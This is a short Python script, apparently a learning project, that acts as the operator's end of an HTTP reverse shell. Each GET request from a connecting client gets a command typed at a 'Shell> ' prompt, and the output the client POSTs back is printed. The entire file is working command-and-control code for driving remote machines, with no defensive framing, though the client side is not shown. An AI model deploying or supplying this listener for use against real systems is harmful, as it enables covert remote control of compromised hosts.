import http.server
import socketserver
import sys


# Defines a class and inherit from SimpleHTTPRequestHandler  By inheriting from this class, MyHandler can use and override the methods and properties of SimpleHTTPRequestHandler.
# If we got a GET request
class MyHandler(http.server.SimpleHTTPRequestHandler):
    # If we got GET request
    def do_GET(self):
        command = input("Shell> ")  # Taking user Input
        self.send_response(200)  # Sending 200 OK Response
        self.send_header("Content-type", "text/html")  # Setting Content Type
        self.end_headers()  # End of Headers
        self.wfile.write(command.encode("utf-8"))  # Send command as bytes

    # If we got POST request
    def do_POST(self):
        self.send_response(200)  # Sending 200 OK Response
        self.end_headers()  # End of headers
        content_length = int(
            self.headers["Content-Length"]
        )  # Getting content length of response
        post_data = self.rfile.read(content_length)  # Read data of response
        print(post_data.decode("utf-8"))  # Print the posted data as a string


def run_server(host_name, host_port):
    """
    It creates an instance of socketserver.tcpserver bound to specified address and port
    """
    with socketserver.TCPServer((host_name, host_port), MyHandler) as httpd:
        print(f"Server started at http://{host_name}:{host_port}")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            sys.stderr.write("[!] Server Terminated\n")


if __name__ == "__main__":
    host_name = "127.0.0.1"
    host_port = 9999
    run_server(host_name, host_port)
